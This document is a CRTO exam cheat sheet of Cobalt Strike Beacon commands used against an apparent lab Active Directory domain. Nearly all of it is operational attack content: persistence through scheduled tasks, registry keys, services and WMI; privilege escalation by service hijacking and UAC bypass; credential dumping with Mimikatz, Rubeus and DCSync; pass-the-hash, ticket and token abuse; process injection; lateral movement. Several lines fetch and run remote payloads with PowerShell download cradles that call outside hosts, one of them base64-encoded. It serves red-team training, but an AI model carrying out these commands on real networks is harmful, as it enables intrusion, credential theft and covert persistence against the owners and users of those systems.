# CRTO

## MISC - Commands

### Command & Control
```r
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target

attacker@ubuntu> sudo systemctl daemon-reload
attacker@ubuntu> sudo systemctl status teamserver.service
attacker@ubuntu> sudo systemctl start teamserver.service
attacker@ubuntu> sudo systemctl enable teamserver.service
```

### Files
```r
# Managing files and directories in Beacon

# List files in the specified directory.
beacon> ls <C:\Path>

# Change to the specified working directory.
beacon> cd [directory]

# Delete a file or folder.
beacon> rm [file\folder]

# Copy a file.
beacon> cp [src] [dest]

# Download a file from the Beacon host path.
beacon> download [C:\filePath]

# List in-progress downloads.
beacon> downloads

# Cancel an in-progress download.
beacon> cancel [*file*]

# Upload a file from the attacker to the current Beacon host.
beacon> upload [/path/to/file]
beacon> upload C:\Temp\payload.txt
```

### Common Commands
```r
|------------------|---------------------------------------------------------------------------------|
| Command          | Description                                                                     |
|------------------|---------------------------------------------------------------------------------|
| `help`           | List of available commands.                                                      |
| `help <module>`  | Shows the help menu of the selected module.                                     |
| `jobs`           | Lists Beacon's running jobs.                                                     |
| `jobkill <id>`   | Terminates the selected job.                                                     |
| `run`            | Executes OS commands using Win32 API calls.                                      |
| `shell`          | Executes OS commands by starting "cmd.exe /c".                                  |
| `drives`         | Lists the system's current drives.                                               |
| `getuid`         | Gets the current user UID.                                                       |
| `sleep`          | Sets the interval and jitter of Beacon callbacks.                                |
| `reg`            | Registry query.                                                                  |
|------------------|---------------------------------------------------------------------------------|
```

### Powershell Commands
Different ways to run Powershell:
```r
# Import a PowerShell .ps1 script from the control server, stored in memory in Beacon.
beacon > powershell-import [/path/to/script.ps1]

# Set up a local TCP server bound to localhost and download the previously imported script using powershell.exe. Then run the specified function with given arguments and return the output.
beacon > powershell [commandlet] [arguments]

# Launch the given function using Unmanaged PowerShell, which does not start powershell.exe. The program used is defined by spawnto (OPSEC).
beacon > powerpick [commandlet] [argument]

# Inject Unmanaged PowerShell into a specific process and run the specified command. Useful for long-running PowerShell jobs.
beacon > psinject [pid] [arch] [commandlet] [arguments]
```

### .NET Remote Execution
Run a local .NET executable as a post-exploitation job in Beacon.  
**Requirement:** Binaries compiled with the "Any CPU" configuration.
```r
beacon > execute-assembly [/path/to/script.exe] [arguments]
beacon > execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
[*] Tasked beacon to run .NET program: Rubeus.exe
[+] host called home, sent: 318507 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
  
  v1.4.2 
```

### Other commands
```r
# Run a web server with Python3
$ python3 -m http.server

# Check outbound access to the TeamServer
$ iwr -Uri http://nickelviper.com/a

# Change inbound firewall rules
beacon> powerpick New-NetFirewallRule -DisplayName "8080-in" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
beacon> powerpick Remove-NetFirewallRule -DisplayName "8080-in"
```

---

# Host Reconnaissance
```r
# Identify running processes such as AV, EDR, or any monitoring and logging solution.
beacon> ps

# Use Seatbelt to enumerate information about the system.
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

# Screenshot capture.
beacon> screenshot

# Clipboard.
beacon> clipboard

# User sessions.
beacon> net logons

# Keylogger.
beacon> keylogger
```

---

# Host Persistence (Normal + Privileged)

```r
# Default PowerShell paths
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell

# Encode the PowerShell payload in Windows.
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA

# Encode the PowerShell payload in Linux.
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://nickelviper.com/a')" | iconv -t UTF-16LE | base64 -w 0
```

## Persistence (Normal)

### MISC - SharpUp
https://github.com/mandiant/SharPersist
```r
# List persistence.
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtaskbackdoor -m list
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -m list
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -m list

# Persistence techniques (-t).
- `keepass` - backdoor keepass config file
- `reg` - registry key addition/modification
- `schtaskbackdoor` - backdoor scheduled task by adding an additional action to it
- `startupfolder` - lnk file in startup folder
- `tortoisesvn` - tortoise svn hook script
- `service` - create new windows service
- `schtask` - create new scheduled task
```

### Task Scheduler
This command uses SharPersist to add a scheduled task (schtask) that runs every hour.
```r
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64" -n "Updater" -m add -o hourly

# Remove persistence from the task.
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -n "Updater" -m remove
```

### Startup Folder
This command uses SharPersist to install persistence via the **Startup folder** of the user. Each time the user logs in, it executes a file (or shortcut) called "UserEnvSetup" that launches PowerShell with the indicated parameters.
```r
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64" -f "UserEnvSetup" -m add

# Remove persistence in the Startup folder shortcut.
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -f "UserEnvSetup" -m remove
```

### RegistryAutoRun
This command uses SharPersist to add a persistence entry in the registry, specifically in the key `hkcurun` (HKCU\Run). This makes `Updater.exe` run automatically at logon.
```r
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

# Remove persistence in the registry.
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -k "hkcurun" -v "Updater" -m remove
```

### COM Hijack
https://dcollao.pages.dev/CRTO/5/L6r5/#hunting-for-com-hijacks

## Persistence (Privileged SYSTEM user)

### Windows Services
This technique sets persistence by creating a Windows Service.
```r
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe

beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
```

### WMI Event Subscriptions
This set of commands creates a malicious WMI event to achieve persistence. Essentially, you upload a payload to the Windows folder, then register a WMI event that triggers when `notepad.exe` starts.
```r
beacon> cd C:\Windows
beacon> upload C:\Payloads\dns_x64.exe
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
```

#### MISC - WMI Event Subscriptions
```r
# Start the Beacon.
beacon> checkin

# Check the event name [event_name].
beacon> powershell Get-WmiEvent -Name WmiBackdoor

# Delete the event name [event_name].
beacon> powershell Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject.
```

---

# Privilege Escalation
**Note**: Use a TCP Beacon for privilege escalation.

## MISC - Privilege Escalation
```r
# List all services and the path to their executables.
beacon> run wmic service get name, pathname

# List services.
beacon> powershell Get-Service | fl

# Show directory ACL.
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl

# Use SharpUp to find exploitable services.
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit
```

## Unquoted Service Paths
This technique exploits a misconfiguration in Windows services that do not use quotes in the executable path. If the path has spaces, Windows might execute a malicious binary you place in the same directory with a similar name instead of the legitimate executable.
```r
# Exploit Unquoted Service Path with Cobalt Strike

# 1. Audit vulnerable services for unquoted service paths.
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath

# 2. Check directory permissions of the vulnerable service directory.
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl

# 3. Change to the vulnerable service directory and list files.
beacon> cd C:\Program Files\Vulnerable Services
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 5kb      fil     02/23/2021 15:04:13   Service 3.exe

# 4. Upload the payload to the vulnerable service directory.
beacon> upload C:\Payloads\tcp-local_x64.svc.exe

# 5. Rename the payload to replace a service executable file.
beacon> mv tcp-local_x64.svc.exe Service.exe

# 6. Restart the vulnerable service to run the payload.
beacon> run sc stop VulnService1
beacon> run sc start VulnService1

# 7. Check for the connection established by the payload.
beacon> run netstat -anp tcp

# 8. Connect to the payload on the configured port (e.g., 4444).
beacon> connect localhost 4444
```

## Weak Service Permission
This technique exploits weak permissions in Windows services, allowing you to modify the binPath of a vulnerable service to replace its executable with your payload. After restarting the service, it launches your malicious binary to get a shell.
```r
# Exploit modifiable services (Weak Service Permission)

# 1. Audit vulnerable services with modifiable permissions.
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

# 2. Import a script to check service permissions.
beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1

# 3. Check permissions of the target service (VulnService2).
beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access

# 4. Confirm the service configuration details.
beacon> run sc qc VulnService2

# 5. Prepare a temp directory to load the payload.
beacon> mkdir C:\Temp
beacon> cd C:\Temp

# 6. Upload the payload to the target system.
beacon> upload C:\Payloads\tcp-local_x64.svc.exe

# 7. Configure the vulnerable service to use the payload.
beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe

# 8. Verify the new service configuration.
beacon> run sc qc VulnService2

# 9. Restart the service to run the payload.
beacon> run sc stop VulnService2
beacon> run sc start VulnService2

# 10. Check for connections made by the payload.
beacon> run netstat -anp tcp

# 11. Connect to the payload on the configured port (e.g., 4444).
beacon> connect localhost 4444
```

## Weak Service Binary Permissions
This technique exploits weak permissions on a service’s binary. If the service’s executable file is modifiable, you can replace it with your malicious payload so that after service restart, your binary runs instead of the legitimate one.
```r
# Exploit services with modifiable permissions (Modifiable Services) - Direct binary replacement

# 1. Audit services with modifiable settings.
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

# 2. Check permissions of the binary associated with the vulnerable service.
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl

# 3. Prepare the payload to replace the original binary.
PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"

# 4. Stop the service to replace the binary.
beacon> run sc stop VulnService3

# 5. Upload the renamed payload to the remote system.
beacon> cd "C:\Program Files\Vulnerable Services"
beacon> upload C:\Payloads\Service 3.exe

# 6. Start the service to run the payload.
beacon> run sc start VulnService3

# 7. Check for connections made by the payload.
beacon> run netstat -anp tcp

# 8. Connect to the payload on the configured port (e.g., 4444).
beacon> connect localhost 4444
```

## UAC Bypass
```r
# Elevate privileges using UAC bypass with schtasks in Beacon

beacon> run whoami /groups
beacon> elevate uac-schtasks tcp-local
```

---

# Credential Theft

## Mimikatz
```r
# The '!' symbol is used to run a command in the elevated System User context.
# The '@' symbol is used to impersonate Beacon’s thread token.

# Dump the local SAM database.
# Contains local accounts' NTLM hashes.
beacon> mimikatz !lsadump::sam

# Dump LSASS.exe logon passwords (Plain Text + Hashes).
# Includes cleartext passwords and NTLM hashes of authenticated users.
# Credentials are stored in Cobalt Strike: View > Credentials.
beacon> mimikatz !sekurlsa::logonpasswords

# Dump the encryption keys used by Kerberos for authenticated users.
# Only works with AES256 keys.
# These credentials must be manually added in Cobalt Strike: View > Credentials > Add.
beacon> mimikatz !sekurlsa::ekeys

# Dump Domain Cached Credentials (DCC).
# Not directly useful for lateral movement, but can be cracked offline.
beacon> mimikatz !lsadump::cache
# Hashcat format for DCC: $DCC2$<iterations>#<username>#<hash>

# Dump the KRBTGT hash from the local Domain Controller.
# The KRBTGT hash is essential for attacks like Golden Ticket.
beacon> mimikatz !lsadump::lsa /inject /name:krbtgt
```

## Rubeus
```r
# List Kerberos tickets in cache for the current logon session or all logon sessions (requires privileged session*).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# Dump the TGT Ticket from the specified logon session (LUID).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x5285c /service:krbtgt /nowrap
```

## DCSync
```r
# Perform DC Sync Attack (nlamb is a Domain Admin account).
beacon> make_token DEV\nlamb F3rrari
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
```

---

# Domain Recon

## PowerView
```r
# Import PowerView.ps1
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1  

# Get domain info (Current/Specific).
# Returns a domain object for the current domain or the specified domain with `-Domain`.
beacon> powerpick Get-Domain  
beacon> powerpick Get-Domain -Domain "dc-2.dev.cyberbotic.io"  

# Get the domain SID.
beacon> powerpick Get-DomainSID  

# Get the Domain Controller.
# Returns the Domain Controllers for the current domain or specified domain.
beacon> powerpick Get-DomainController | select Forest, Name, OSVersion | fl  

# Get forest info.
# Returns all domains for the current or specified forest with `-Forest`.
beacon> powerpick Get-ForestDomain  
beacon> powerpick Get-ForestDomain -Forest ""  

# Get the Domain Policy.
# Returns the default domain or domain controller policy for the current or specified domain/controller.
beacon> powerpick Get-DomainPolicyData | select -expand SystemAccess  

# Get domain users.
# Returns all users (or specific users). Use `-Properties` to return only certain properties, use `-Identity` to return a specific user.
beacon> powerpick Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl  
beacon> powershell Get-DomainUser -Identity jking | fl  
beacon> powershell Get-DomainUser | fl  
beacon> powershell Get-DomainUser -Properties DisplayName, MemberOf | fl  

# Identify Kerberoastable/AS-REPRoastable/Unconstrained Delegation users.
beacon> powerpick Get-DomainUser | select cn,serviceprincipalname  
beacon> powerpick Get-DomainUser -PreauthNotRequired  
beacon> powerpick Get-DomainUser -TrustedToAuth  

# Get domain computers.
# Returns all computers or specific computer objects.
beacon> powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName  

# Identify machine accounts with unconstrained or constrained delegation.
beacon> powerpick Get-DomainComputer -Unconstrained | select cn, dnshostname  
beacon> powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto  

# Get OUs.
# Searches for all Organizational Units (OUs) or specific OU objects.
beacon> powerpick Get-DomainOU -Properties Name | sort -Property Name  

# Identify computers in a specific OU.
beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName  

# Get domain groups (Use -Recurse).
# Returns all domain groups or specific domain group objects.
beacon> powerpick Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName  
beacon> powerpick Get-DomainGroup | select SamAccountName  

# Get members of a domain group.
# Returns the members of a specific domain group.
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName  
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberDistinguishedName  

# Get domain GPOs.
# Returns all GPOs or specific GPO objects. Use `-ComputerIdentity` to enumerate a specific computer.
beacon> powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName  
beacon> powershell Get-DomainGPO -ComputerIdentity "" -Properties DisplayName | sort -Property DisplayName  

# Find which systems a specific GPO is applied to.
beacon> powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName  

# Identify domain users/groups with local admin rights via Restricted Groups or GPO.
# Returns all GPOs that modify local group membership via Restricted Groups or Group Policy Preferences.
beacon> powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName  

# Enumerate machines where a domain user/group has local admin rights.
# Lists machines where a specified domain user/group is a member of a specific local group.
beacon> powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl  

# Get domain trusts.
# Returns all domain trusts for the current or specified domain.
beacon> powerpick Get-DomainTrust  

# Find local admin access on other machines in the domain based on the current user context.
beacon> powerpick Find-LocalAdminAccess  
beacon> powerpick Invoke-CheckLocalAdminAccess -ComputerName <server_fqdn>  

# This command searches for users in the domain or system who may be interesting lateral movement or escalation targets. Essentially, it helps identify potentially valuable accounts.
beacon> powerpick Invoke-UserHunter  

# This command checks if you have local admin privileges on the specified server using PS Remoting. i.e., if you can remotely execute commands with elevated privileges.
beacon> powerpick Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>

# Similar to the above, but uses WMI to check for local admin privileges on the target server. This gives another approach to confirm if you can do lateral movement using available permissions.
beacon> powerpick Find-WMILocalAdminAccess -ComputerName <server_fqdn>
```

## SharpView
```r
beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
```

## ADSearch
```r
# Search all users.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"

# Search all groups.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=group"

# Filter by group and search members.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member

# List Kerberostable Users.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

# List ASREP-ROAST Users.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

# List Unconstrained Delegation.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# List Constrained Delegation.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
```

# User Impersonation

## Pass the Hash Attack
Pass the hash is a technique that lets you authenticate to a Windows service using the NTLM hash of a user’s password.  
**This command requires elevated privileges**.
```r
# PTH (Pass the Hash) using the built-in Cobalt Strike method

# 1. Verify the current Beacon identity.
beacon> getuid

# 2. Attempt to access a remote share using current credentials.
beacon> ls \\web.dev.cyberbotic.io\c$
[-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED

# 3. Execute a Pass the Hash (PTH) to impersonate a known user with their NTLM hash.
# In this case, `DEV\jking` is the target user, and we have his NTLM hash.
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
# After running this command, Beacon uses the generated token to act as `DEV\jking`.

# 4. Verify if you now have access to the remote share.
beacon> ls \\web.dev.cyberbotic.io\c$
# If `DEV\jking` credentials have sufficient privileges, you should see the share’s contents.

# 5. Look for local admin access on the remote system.
beacon> powerpick Find-LocalAdminAccess -ComputerName web.dev.cyberbotic.io

# 6. Revert identity to the original Beacon token if necessary.
beacon> rev2self
```

## Pass the Ticket Attack
A technique that allows adding Kerberos tickets to an existing logon session (LUID) you have access to or to a new one you create.  
**Creating a new logon session or passing tickets to sessions you do not own typically requires elevated privileges.**  
Rubeus `triage` and `dump` help with ticket extraction.
```r
# Add and use Kerberos tickets in existing or new sessions

# 1. Identify active Kerberos tickets in memory.
# Lists all tickets cached in the current or all sessions (requires elevated privileges to see all sessions).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
# Example output:
# | 0x7049f | jking @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO | 9/1/2022 5:29:20 PM |
# LUID is `0x7049f`, user is `jking`, TGT is for domain `DEV.CYBERBOTIC.IO`.

# 2. Dump the TGT associated to a specific logon session (LUID).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt /nowrap
# Example extracted ticket:
# doIFuj [...snip...] lDLklP

# 3. Create a new "sacrificial" logon session.
# This creates an isolated session with `createnetonly`, useful for injecting a ticket without affecting active sessions.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
# Example output:
# LUID generated: `0x798c2c`. Note this LUID for the next step.

# 4. Inject the TGT into the new session.
# Use the LUID from the previous command and the extracted TGT from step 2.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP
# The TGT is now associated with the sacrificial logon session.

# 5. Verify the TGT is active in the new session.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
# Check if the ticket is tied to LUID `0x798c2c`.

# 6. Impersonate the token of the newly created process with the TGT.
# Use the PID from the process created with `createnetonly`.
beacon> steal_token 4748

# 7. Perform operations with the impersonated token.
beacon> ls \\dc-2.dev.cyberbotic.io\c$

# 8. Revert to the original Beacon token or kill the sacrificial process.
beacon> rev2self
beacon> kill 4748
```

## Overpass the Hash Attack
A technique that allows requesting a Kerberos TGT for a user by presenting their NTLM or AES hash.  
`Rubeus asktgt` covers that need. **The TGT can then be used for a Pass the Ticket (PtT) attack.**
```r
# Requesting a TGT using Rubeus with NTLM or AES hash for a Pass the Ticket attack

# 1. Request a TGT for `jking` using his NTLM hash.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap

# 2. Request a TGT with AES256 hash for better OPSEC.
# Use `/domain` and `/opsec` flags to reduce footprints.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
doIFuj [...snip...] ljLmlv

# 3. Use the TGT for a Pass the Ticket (PtT) attack.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj [...snip...] ljLmlv
```

## Token Impersonation
This technique obtains a handle to the target process, opens and duplicates its primary access token, and impersonates it.
```r
# Token impersonation via `steal_token`

# 1. Identify the target process and associated user.
beacon> ps

 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 5536  1020  mmc.exe                                x64   0           DEV\jking

# 2. Steal the primary token of the target process.
beacon> steal_token 5536

# 3. Verify permissions by accessing a remote resource with the impersonated token.
beacon> ls \\web.dev.cyberbotic.io\c$
[*] Listing: \\web.dev.cyberbotic.io\c$\

# 4. If the user (DEV\jking) has appropriate permissions, proceed with lateral movement.
beacon> jump psexec64 web.dev.cyberbotic.io smb
```

## Token Store
This is an evolution of the steal_token command, letting you store tokens for future use.
```r
# Advanced token management with `token-store`

# 1. Steal and store a token for future use.
beacon> token-store steal 5536
[*] Stored Tokens

 ID   PID   User
 --   ---   ----
 0    5536  DEV\jking

# 2. List all stored tokens.
beacon> token-store show

# 3. Impersonate a stored token by its ID.
beacon> token-store use 0
[+] Impersonated DEV\jking

# 4. Revert to the Beacon’s original token.
beacon> rev2self
[*] Tasked beacon to revert token

# 5. Remove a specific stored token.
beacon> token-store remove <id>

# 6. Remove all stored tokens.
beacon> token-store remove-all
```

## Make Token
The `make_token` command lets you impersonate a user if you know their plaintext password.
```r
# Impersonate users with `make_token`

# 1. Use `make_token` to impersonate a known user with a plaintext password.
# Example: user jking:
beacon> make_token DEV\jking Qwerty123
[+] Impersonated DEV\jking (netonly)

# 2. Verify impersonation by running a remote command with WinRM.
beacon> remote-exec winrm web.dev.cyberbotic.io whoami
dev\jking

# 3. Impersonate another user, like mssql_svc, with its plaintext password.
beacon> make_token DEV\mssql_svc Cyberb0tic

# 4. Verify impersonation on another remote system.
beacon> remote-exec winrm sql-2.dev.cyberbotic.io whoami
dev\mssql_svc
```

## Process Injection
Process injection allows us to inject arbitrary shellcode into a process of our choice. You can only inject into processes where you can obtain a handle with enough privileges to write to its memory. Without elevation, you’re typically limited to your own processes; with elevation, you can target other users’ processes.

Beacon has two main injection commands: `shinject` and `inject`. `shinject` lets you inject arbitrary shellcode from a binary file on the attacker machine, while `inject` injects a full Beacon payload for the specified listener.
```r
# Inject Beacon into an existing process

# 1. Inject a Beacon into a specific process using its PID.
# Example:
beacon> inject 4464 x64 tcp-local
[*] Tasked beacon to inject windows/beacon_bind_tcp (127.0.0.1:4444) into 4464 (x64)
[+] established link to child beacon: 10.10.123.102

# Details:
# - `4464`: The target process PID.
# - `x64`: The process architecture (64-bit).
# - `tcp-local`: The configured listener name.

# 2. Inject a payload from an executable binary using `shinject`.
# Example:
beacon> shinject /path/to/binary

# Notes:
# - This command loads and injects shellcode from the specified binary directly into a remote process.
# - Ideal when you don’t want to load the payload from the Cobalt Strike server.
```

---

# Lateral Movement

:warning: **OPSEC** Use the `spawnto` command to change the process Beacon will spawn for post-exploitation tasks. The default is `rundll32.exe`.

- **portscan:** Scans ports on a specific target.
  ```
  portscan [ip or ip range] [ports]
  portscan 172.16.48.0/24 1-2048,3000,8080
  ```

- **runas:** A wrapper around `runas.exe`; with credentials, run a command as another user.
  ```
  runas [DOMAIN\user] [password] [command] [arguments]
  runas CORP\Administrator securePassword12! Powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.50.90:80/filename'))"
  ```

- **pth:** Provide a user and NTLM hash to perform a Pass The Hash attack and inject a TGT into the current process. **Requires Administrator privileges. :warning:**
  ```
  pth [DOMAIN\user] [hash]
  pth CORP\Administrator 97fc053bc0b23588798277b22540c40d
  ```

- **steal_token:** Steal a token from a specific process.

- **make_token:** Provide credentials to create an impersonation token in the current process and run commands as the impersonated user.
  ```
  make_token DEV\mssql_svc Cyberb0tic
  ```

- **jump:** A quick method to do lateral movement using `winrm` or `psexec` to spawn a new Beacon session on a target.  
  The `jump` command will use the current impersonation/delegation token to authenticate to the remote target. :warning:  
  You can combine `jump` with `make_token` or `pth` for a fast "jump" to another target.
  ```
  jump [psexec64,psexec,psexec_psh,winrm64,winrm] [server/workstation] [listener]
  jump psexec64 DC01 Lab-HTTPS
  jump winrm WS04 Lab-SMB
  jump psexec_psh WS01 Lab-DNS
  ```

- **remote-exec:** Executes a command on a remote target using `psexec`, `winrm`, or `wmi`.  
  The `remote-exec` command will use the current impersonation/delegation token to authenticate to the remote target. :warning:
  ```
  remote-exec [method] [target] [command]
  ```

- **ssh/ssh-key:** Authenticates using `ssh` with a password or private key. Works for both Linux and Windows hosts.

:warning: All commands launch `powershell.exe`.

**OPSEC Pass-the-Hash:**
```
mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:"powershell -w hidden"
steal_token PID
```

**Take control of the artifact**  
Use `link` to connect to an SMB Beacon  
Use `connect` to connect to a TCP Beacon  

### jump
```r
# Jump

# 1. Use `jump` to move laterally with different methods.
beacon> jump psexec/psexec64/psexec_psh/winrm/winrm64 ComputerName beacon_listener

# 2. Example using `winrm64`.
# Use Windows Remote Management to launch a beacon listener on the target.
beacon> jump winrm64 web.dev.cyberbotic.io smb

# 3. Upload a Windows service binary and create a Windows service to run it as SYSTEM.
beacon> jump psexec64 web.dev.cyberbotic.io smb
beacon> jump psexec64 sql-2.dev.cyberbotic.io smb

# 4. Execute a PowerShell-encoded command (32-bit) using `psexec_psh`.
# This uses Powershell with a Base64-encoded command line.
beacon> jump psexec_psh web smb
```

### remote-exec
```r
# remote-exec

# 1. Use remote-exec with psexec, winrm, or wmi to run an uploaded binary on a remote system.
beacon> remote-exec psexec/winrm/wmi ComputerName <uploaded binary on remote system>

# 2. Example using WMI (Windows Management Instrumentation).
# Upload the payload to the remote system, then execute it.
beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe

# 3. Establish a link to the compromised system.
